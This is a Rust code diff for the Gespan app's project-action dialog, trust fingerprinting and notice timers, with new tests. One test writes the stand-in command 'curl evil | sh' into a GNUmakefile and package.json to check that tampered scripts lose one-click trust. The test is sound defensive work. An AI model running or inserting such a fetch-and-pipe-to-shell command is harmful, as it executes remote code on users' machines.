@@ -44,8 +44,12 @@ pub(super) struct ActionDialog {
     detail: Option<String>,
     /// A new action goes to `.gespan/tasks.json`; off keeps it personal.
     share: bool,
-    /// The shared file has comments, so the dialog offers to open it instead.
-    comments: bool,
+    /// The command a project action was filled in with. Saving it unchanged
+    /// keeps the task's command as written in the file.
+    prefilled: Option<String>,
+    /// Why the shared file must be edited by hand, such as its comments; the
+    /// dialog then offers to open it instead of saving.
+    hand_edit: Option<SharedString>,
     error: Option<SharedString>,
     _events: Vec<Subscription>,
 }
@@ -55,8 +59,9 @@ pub(super) struct ActionListing {
     project: String,
     checkout: String,
     listing: Listing,
-    /// Each source file's digest when it was read, keyed by its file label.
-    digests: HashMap<String, String>,
+    /// Every source file's digest when it was read, so an edit to any of them,
+    /// such as a script body, ends one-click trust.
+    digest: String,
 }
 
 /// Hands `project`'s personal actions to core, so agents list them too.
@@ -87,8 +92,8 @@ fn expand_env(env: &[(String, String)]) -> Vec<(String, String)> {
         .collect()
 }
 
-/// What `action` runs: its command, cwd and env, and `digest`, its source
-/// file's. A repo can change any of them, such as a script's body behind an
+/// What `action` runs: its command, cwd and env, and `digest`, the source
+/// files'. A repo can change any of them, such as a script's body behind an
 /// unchanged `bun run dev`, and a one-click run must run only what the user
 /// already ran.
 fn fingerprint(action: &Action, digest: &str) -> String {
@@ -138,19 +143,12 @@ impl Shell {
     fn detect_actions(&self, cx: &App) -> ActionListing {
         let checkout = self.terminal_cwd(cx);
         let listing = self.listing(cx);
-        let mut digests = HashMap::new();
-        // Personal actions live outside the repository.
-        for action in listing.actions.iter().filter(|a| a.source != PERSONAL) {
-            if !digests.contains_key(&action.file) {
-                let digest = project_actions::source_digest(Path::new(&checkout), &action.file);
-                digests.insert(action.file.clone(), digest);
-            }
-        }
+        let digest = project_actions::sources_digest(Path::new(&checkout));
         ActionListing {
             project: self.workspace.project.clone(),
             checkout,
             listing,
-            digests,
+            digest,
         }
     }
     /// Detects the actions again, for a menu that is opening.
@@ -173,13 +171,14 @@ impl Shell {
             .filter(|l| l.project == self.workspace.project)
             .map_or(&[], |l| l.listing.actions.as_slice())
     }
-    /// `action`'s fingerprint, with its source file as last read.
+    /// `action`'s fingerprint, with the source files as last read. A personal
+    /// action lives outside the repository, so no file changes it.
     fn fingerprint(&self, action: &Action) -> String {
         let digest = self
             .action_listing
             .as_ref()
-            .and_then(|l| l.digests.get(&action.file))
-            .map_or("", String::as_str);
+            .filter(|_| action.source != PERSONAL)
+            .map_or("", |l| l.digest.as_str());
         fingerprint(action, digest)
     }
     /// The action the footer button runs: the last one run from here, only
@@ -473,16 +472,21 @@ impl Shell {
     /// A short note, such as where an action was saved, that goes by itself.
     fn show_action_notice(&mut self, text: &'static str, cx: &mut Context<Self>) {
         self.action_notice = Some(text.into());
+        // Each note gets its own number, so an older note's timer never
+        // clears a newer one, even with the same text.
+        self.action_notice_seq += 1;
+        let seq = self.action_notice_seq;
         cx.spawn(async move |this, cx| {
             cx.background_executor().timer(NOTICE_FOR).await;
-            let _ = this.update(cx, |this, cx| {
-                if this.action_notice.as_deref() == Some(text) {
-                    this.action_notice = None;
-                    cx.notify();
-                }
-            });
+            let _ = this.update(cx, |this, cx| this.expire_action_notice(seq, cx));
         })
         .detach();
+    }
+    /// Clears the note numbered `seq`, if it is still the one showing.
+    fn expire_action_notice(&mut self, seq: u64, cx: &mut Context<Self>) {
+        if self.action_notice_seq == seq && self.action_notice.take().is_some() {
+            cx.notify();
+        }
     }
     /// The note in the notification stack, if one is showing.
     pub(super) fn action_notice_card(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
@@ -606,6 +610,18 @@ impl Shell {
         cx: &mut Context<Self>,
     ) {
         self.close_preview(cx);
+        // A shared action that can't run, such as one that asks for input,
+        // is fixed in the file itself.
+        if let Some(id) = &editing
+            && id.starts_with(&format!("{PROJECT}:"))
+            && self
+                .actions()
+                .iter()
+                .any(|a| a.id == *id && a.blocked.is_some())
+        {
+            self.open_tasks_json(window, cx);
+            return;
+        }
         // What to fill in: an editable action's name, command, icon, detail.
         let existing = match editing {
             Some(id) if id.starts_with(&format!("{PROJECT}:")) => {
@@ -657,9 +673,12 @@ impl Shell {
             }),
         ];
         window.focus(&name.read(cx).focus_handle(cx), cx);
-        let (editing, (icon, detail)) = match existing {
-            Some((editing, (_, _, icon, detail))) => (Some(editing), (icon, detail)),
-            None => (None, (ACTION_ICONS[0], None)),
+        let (editing, (prefilled, icon, detail)) = match existing {
+            Some((editing, (_, line, icon, detail))) => {
+                let prefilled = matches!(editing, Editing::Project(_)).then_some(line);
+                (Some(editing), (prefilled, icon, detail))
+            }
+            None => (None, (None, ACTION_ICONS[0], None)),
         };
         self.action_dialog = Some(ActionDialog {
             icon,
@@ -668,7 +687,8 @@ impl Shell {
             name,
             command,
             share: true,
-            comments: false,
+            prefilled,
+            hand_edit: None,
             error: None,
             _events: events,
         });
@@ -678,13 +698,13 @@ impl Shell {
     pub(super) fn toggle_action_share(&mut self, cx: &mut Context<Self>) {
         if let Some(dialog) = &mut self.action_dialog {
             dialog.share = !dialog.share;
-            dialog.comments = false;
+            dialog.hand_edit = None;
             dialog.error = None;
             cx.notify();
         }
     }
     /// Opens `.gespan/tasks.json` in the file editor, as the explorer opens a
-    /// file, so a file with comments can be edited by hand.
+    /// file, for what Gespan won't rewrite itself.
     pub(super) fn open_tasks_json(&mut self, window: &mut Window, cx: &mut Context<Self>) {
         let path = Path::new(&self.terminal_cwd(cx)).join(TASKS_JSON);
         self.close_action_dialog(window, cx);
@@ -692,11 +712,14 @@ impl Shell {
         let path = path.to_string_lossy().into_owned();
         self.open_review(crate::review::ReviewTab::File { cwd, path }, window, cx);
     }
-    /// Shows why a shared write failed, offering to open a commented file.
+    /// Shows why a shared write failed, offering to open the file when only
+    /// a hand edit will do.
     fn write_failed(&mut self, error: WriteError, cx: &mut Context<Self>) {
         if let Some(dialog) = &mut self.action_dialog {
-            dialog.comments = error == WriteError::HasComments;
-            dialog.error = Some(error.to_string().into());
+            let message: SharedString = error.to_string().into();
+            let by_hand = matches!(error, WriteError::HasComments | WriteError::NeedsHandEdit);
+            dialog.hand_edit = by_hand.then(|| message.clone());
+            dialog.error = Some(message);
             cx.notify();
         }
     }
@@ -723,6 +746,9 @@ impl Shell {
             _ => None,
         };
         if let Some(label) = shared {
+            // Asked again on each try: the file may have been fixed since.
+            dialog.hand_edit = None;
+            let unchanged = dialog.prefilled.as_deref().map(str::trim) == Some(command.as_str());
             let draft = Draft {
                 label: name,
                 command,
@@ -733,6 +759,9 @@ impl Shell {
             let checkout = Path::new(&checkout);
             let written = match &label {
                 None => write::add(checkout, &draft),
+                // Only the name, icon or detail changed: the command stays
+                // exactly as the file has it.
+                Some(label) if unchanged => write::relabel(checkout, label, &draft),
                 Some(label) => write::update(checkout, label, &draft),
             };
             match written {
@@ -885,12 +914,8 @@ impl Shell {
                     }))
             }));
         let title = if editing { "Edit action" } else { "Add action" };
-        // A commented file isn't rewritten; its message stays while typing.
-        let error = dialog.error.clone().or_else(|| {
-            dialog
-                .comments
-                .then(|| WriteError::HasComments.to_string().into())
-        });
+        // Why the file needs a hand edit stays while typing.
+        let error = dialog.error.clone().or_else(|| dialog.hand_edit.clone());
         let share = dialog.share;
         let share_toggle =
             div()
@@ -939,7 +964,7 @@ impl Shell {
                         )),
                 )
                 .on_click(cx.listener(|this, _, _, cx| this.toggle_action_share(cx)));
-        let primary = if dialog.comments {
+        let primary = if dialog.hand_edit.is_some() {
             crate::modal::primary_button("action-open-tasks", "Open tasks.json")
                 .debug_selector(|| "action-open-tasks".into())
                 .w_full()
@@ -1615,7 +1640,7 @@ mod tests {
                     dialog.error.as_ref().map(|e| e.to_string()),
                     Some("An action named \u{201c}Deploy\u{201d} already exists.".into())
                 );
-                assert!(!dialog.comments);
+                assert!(dialog.hand_edit.is_none());
                 assert!(shell.action_notice.is_none());
                 assert_eq!(shared(root)["tasks"].as_array().unwrap().len(), 1);
             })
@@ -1810,16 +1835,16 @@ mod tests {
                     dialog.error.as_ref().map(|e| e.to_string()),
                     Some("This tasks.json has comments, so Gespan won't rewrite it.".into())
                 );
-                assert!(dialog.comments);
+                assert!(dialog.hand_edit.is_some());
                 // Delete is refused the same way.
                 shell.delete_action(window, cx);
-                assert!(shell.action_dialog.as_ref().unwrap().comments);
+                assert!(shell.action_dialog.as_ref().unwrap().hand_edit.is_some());
                 // A new shared action too.
                 shell.close_action_dialog(window, cx);
                 shell.open_action_dialog(None, window, cx);
                 type_action(shell, "New", "echo new", cx);
                 shell.save_action(window, cx);
-                assert!(shell.action_dialog.as_ref().unwrap().comments);
+                assert!(shell.action_dialog.as_ref().unwrap().hand_edit.is_some());
                 assert_eq!(
                     std::fs::read_to_string(root.join(".gespan/tasks.json")).unwrap(),
                     text
@@ -1847,6 +1872,210 @@ mod tests {
                     "{:?}",
                     review.state.tabs
                 );
+
+                // The comment goes, by hand. The next try asks the file again:
+                // a name clash is now the only trouble, with nothing to open.
+                write(root, ".gespan/tasks.json", &text.replace("  // Ours\n", ""));
+                shell.open_action_dialog(None, window, cx);
+                type_action(shell, "New", "echo new", cx);
+                shell.action_dialog.as_mut().unwrap().hand_edit = Some("stale".into());
+                type_action(shell, "Ship", "echo new", cx);
+                shell.save_action(window, cx);
+                let dialog = shell.action_dialog.as_ref().unwrap();
+                assert!(dialog.hand_edit.is_none());
+                assert_eq!(
+                    dialog.error.as_ref().map(|e| e.to_string()),
+                    Some("An action named \u{201c}Ship\u{201d} already exists.".into())
+                );
+                type_action(shell, "New", "echo new", cx);
+                shell.save_action(window, cx);
+                assert!(shell.action_dialog.is_none());
+                assert_eq!(shared(root)["tasks"][1]["label"], "New");
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn editing_only_the_name_keeps_workspace_folder_args_and_os_overrides(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let build = r#"{ "label": "Build", "type": "process", "command": "${workspaceFolder}/build.sh",
+              "args": ["--fast", "a b"], "options": { "env": { "MODE": "dev" } },
+              "windows": { "command": "build.cmd" }, "detail": "Builds", "group": "build" }"#;
+        write(root, ".gespan/tasks.json", &tasks(build));
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("edit:gespan:Build", window, cx);
+                // The dialog shows what runs here, this checkout's path in it.
+                let command = shell.action_dialog.as_ref().unwrap().command.clone();
+                let shown = command.read(cx).content.to_string();
+                assert!(shown.contains(&root.display().to_string()), "{shown}");
+                type_action(shell, "Build all", &shown, cx);
+                shell.action_dialog.as_mut().unwrap().icon = "hammer";
+                shell.save_action(window, cx);
+                assert!(shell.action_dialog.is_none());
+                // Only the name and icon changed in the shared file.
+                assert_eq!(
+                    shared(root)["tasks"][0],
+                    serde_json::json!({
+                        "label": "Build all", "type": "process",
+                        "command": "${workspaceFolder}/build.sh", "args": ["--fast", "a b"],
+                        "options": { "env": { "MODE": "dev" } },
+                        "windows": { "command": "build.cmd" }, "detail": "Builds",
+                        "group": "build", "icon": { "id": "hammer" },
+                    })
+                );
+                let text = std::fs::read_to_string(root.join(".gespan/tasks.json")).unwrap();
+                assert!(!text.contains(&root.display().to_string()), "{text}");
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn a_new_command_for_a_task_with_args_is_refused_with_open_tasks_json(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let lint = tasks(r#"{ "label": "Lint", "command": "eslint", "args": ["."] }"#);
+        write(root, ".gespan/tasks.json", &lint);
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("edit:gespan:Lint", window, cx);
+                type_action(shell, "Lint", "eslint src", cx);
+                shell.save_action(window, cx);
+                let dialog = shell.action_dialog.as_ref().expect("the dialog stays open");
+                let message = "This action uses arguments, per-OS commands or workspace \
+                               variables; edit it in tasks.json";
+                assert_eq!(
+                    dialog.error.as_ref().map(|e| e.to_string()),
+                    Some(message.into())
+                );
+                assert_eq!(
+                    dialog.hand_edit.as_ref().map(|e| e.to_string()),
+                    Some(message.into())
+                );
+                assert_eq!(
+                    std::fs::read_to_string(root.join(".gespan/tasks.json")).unwrap(),
+                    lint
+                );
+            })
+            .unwrap();
+        let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
+        visual.run_until_parked();
+        assert!(visual.debug_bounds("action-open-tasks").is_some());
+    }
+
+    #[gpui::test]
+    fn a_blocked_project_action_opens_tasks_json_to_edit(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        write(
+            root,
+            ".gespan/tasks.json",
+            &tasks(r#"{ "label": "Pick", "command": "echo ${input:target}" }"#),
+        );
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                let edit = submenu(&shell.actions_menu(), "Edit action");
+                assert_eq!(edit, [("edit:gespan:Pick".into(), "Pick".into())]);
+                shell.run_actions_menu("edit:gespan:Pick", window, cx);
+                assert!(shell.action_dialog.is_none());
+                let path = root
+                    .join(".gespan/tasks.json")
+                    .to_string_lossy()
+                    .into_owned();
+                let review = shell.reviews[&active].read(cx);
+                assert!(review.state.tabs.iter().any(|tab| matches!(
+                    tab,
+                    crate::review::ReviewTab::File { path: open, .. } if *open == path
+                )));
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn any_source_file_change_resets_one_click_trust(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let package = |body: &str| format!(r#"{{ "scripts": {{ "dev": "{body}" }} }}"#);
+        write(root, "package.json", &package("vite"));
+        write(root, "bun.lock", "");
+        write(root, "Makefile", "build:\n\techo one\n");
+        write(root, "GNUmakefile", "build:\n\techo one\n");
+        // A `.gespan` action saved from package.json still runs its script.
+        write(
+            root,
+            ".gespan/tasks.json",
+            &tasks(r#"{ "label": "Dev", "command": "bun run dev" }"#),
+        );
+        let (window, _, active) = crate::shell::tests::window(cx);
+        let count = |shell: &Shell| {
+            shell
+                .terminals
+                .get(&shell.workspace.project)
+                .map_or(0, Vec::len)
+        };
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("run:make:build", window, cx);
+                assert_eq!(count(shell), 1);
+                assert!(shell.footer_action().is_some());
+            })
+            .unwrap();
+        // make runs GNUmakefile first; detection reads Makefile.
+        write(root, "GNUmakefile", "build:\n\tcurl evil | sh\n");
+        window
+            .update(cx, |shell, window, cx| {
+                shell.run_footer_action(window, cx);
+                assert!(shell.menu_open(&MenuTarget::Actions));
+                assert_eq!(count(shell), 1);
+                shell.close_menu(cx);
+
+                shell.run_actions_menu("run:gespan:Dev", window, cx);
+                assert_eq!(count(shell), 2);
+                assert!(shell.footer_action().is_some());
+            })
+            .unwrap();
+        // package.json's body changes; `.gespan/tasks.json` doesn't.
+        write(root, "package.json", &package("curl evil | sh"));
+        window
+            .update(cx, |shell, window, cx| {
+                shell.run_footer_action(window, cx);
+                assert!(shell.menu_open(&MenuTarget::Actions));
+                assert_eq!(count(shell), 2);
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn an_older_notice_timer_never_clears_a_newer_notice(cx: &mut gpui::TestAppContext) {
+        let (window, _, _) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, _, cx| {
+                shell.show_action_notice(super::ADDED, cx);
+                let first = shell.action_notice_seq;
+                // The same text again, before the first note's time is up.
+                shell.show_action_notice(super::ADDED, cx);
+                let second = shell.action_notice_seq;
+                assert_ne!(first, second);
+                shell.expire_action_notice(first, cx);
+                assert!(shell.action_notice.is_some());
+                shell.expire_action_notice(second, cx);
+                assert!(shell.action_notice.is_none());
             })
             .unwrap();
     }
